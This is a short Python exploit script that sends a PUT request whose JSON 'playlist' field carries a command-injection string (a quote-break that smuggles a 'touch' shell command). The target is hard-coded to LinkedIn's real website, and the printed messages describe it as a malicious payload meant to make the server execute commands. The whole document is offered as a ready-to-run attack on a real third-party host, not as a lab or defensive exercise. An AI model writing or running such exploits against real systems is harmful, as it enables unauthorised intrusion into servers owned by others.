import requests
import json

TARGET = "https://www.linkedin.com"

INJECTED_COMMAND = "test';touch rced_by_xu17.txt;echo '"

payload = {
    "playlist": INJECTED_COMMAND,
    "shuffle": "True"
}

# HTTP headers
headers = {
    "Content-Type": "application/json",
    "User-Agent" : "Mozilla/5.0"
}

def exploit():
    print("[+] Sending malicious JSON payload to trigger command injection>/..")
    try:
        response = requests.put(TARGET, headers=headers, data=json.dumps(payload), timeout=5)
        print(f"[+] HTTP Status Code: {response.status_code}")
        print("[+] if the target is vulnerable, the command should be executed on the server.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    exploit()